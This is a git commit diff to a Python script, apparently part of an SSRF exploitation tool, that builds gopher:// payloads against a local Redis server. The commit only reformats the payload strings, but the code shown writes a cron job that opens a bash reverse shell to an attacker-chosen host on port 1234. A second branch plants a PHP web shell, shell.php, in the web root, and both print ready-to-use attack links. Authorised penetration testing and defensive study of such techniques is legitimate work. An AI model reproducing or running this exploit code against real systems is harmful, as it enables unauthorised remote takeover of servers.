57d1d072088d09112ef52f5ab0731f72a7b319b5
tarunkant <tarunkant05@gmail.com>
2018-12-10 15:41:19 +0530

    Modified the file according to issue no #4

--- scripts/Redis.py
+++ scripts/Redis.py
@@ -11,43 +11,43 @@ def Redis():
         cmd = '*/1 * * * * bash -c "sh -i >& /dev/tcp/' + server + '/1234 0>&1"'
         len_cmd = len(cmd) + 5
         payload = """*1\r
-    $8\r
-    flushall\r
-    *3\r
-    $3\r
-    set\r
-    $1\r
-    1\r
-    $""" + str(len_cmd) + """\r
+$8\r
+flushall\r
+*3\r
+$3\r
+set\r
+$1\r
+1\r
+$""" + str(len_cmd) + """\r
 
 
-    """ + cmd + """
+""" + cmd + """
 
 
-    \r
-    *4\r
-    $6\r
-    config\r
-    $3\r
-    set\r
-    $3\r
-    dir\r
-    $""" + str(len(crontab_dir)) + """\r
-    """ + crontab_dir + """\r
-    *4\r
-    $6\r
-    config\r
-    $3\r
-    set\r
-    $10\r
-    dbfilename\r
-    $4\r
-    root\r
-    *1\r
-    $4\r
-    save\r
+\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$3\r
+dir\r
+$""" + str(len(crontab_dir)) + """\r
+""" + crontab_dir + """\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$10\r
+dbfilename\r
+$4\r
+root\r
+*1\r
+$4\r
+save\r
 
-    """
+"""
         finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
         print "\033[93m" +"\nYour gopher link is ready to get Reverse Shell: \n"+ "\033[0m"
         print "\033[04m" +"gopher://127.0.0.1:6379/_" + finalpayload+ "\033[0m"
@@ -65,42 +65,42 @@ def Redis():
         if(not web_root_location):
             web_root_location = "/var/www/html"
         payload = """*1\r
-    $8\r
-    flushall\r
-    *3\r
-    $3\r
-    set\r
-    $1\r
-    1\r
-    $""" + str(len(php_payload) + 4) + """\r
+$8\r
+flushall\r
+*3\r
+$3\r
+set\r
+$1\r
+1\r
+$""" + str(len(php_payload) + 4) + """\r
 
 
-    """ + php_payload + """
+""" + php_payload + """
 
-    \r
-    *4\r
-    $6\r
-    config\r
-    $3\r
-    set\r
-    $3\r
-    dir\r
-    $""" + str(len(web_root_location)) + """\r
-    """ + web_root_location + """\r
-    *4\r
-    $6\r
-    config\r
-    $3\r
-    set\r
-    $10\r
-    dbfilename\r
-    $9\r
-    shell.php\r
-    *1\r
-    $4\r
-    save\r
+\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$3\r
+dir\r
+$""" + str(len(web_root_location)) + """\r
+""" + web_root_location + """\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$10\r
+dbfilename\r
+$9\r
+shell.php\r
+*1\r
+$4\r
+save\r
 
-    """
+"""
         finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
         print "\033[93m" +"\nYour gopher link is Ready to get PHP Shell: \n"+ "\033[0m"
         print "\033[04m" +"gopher://127.0.0.1:6379/_" + finalpayload+ "\033[0m"
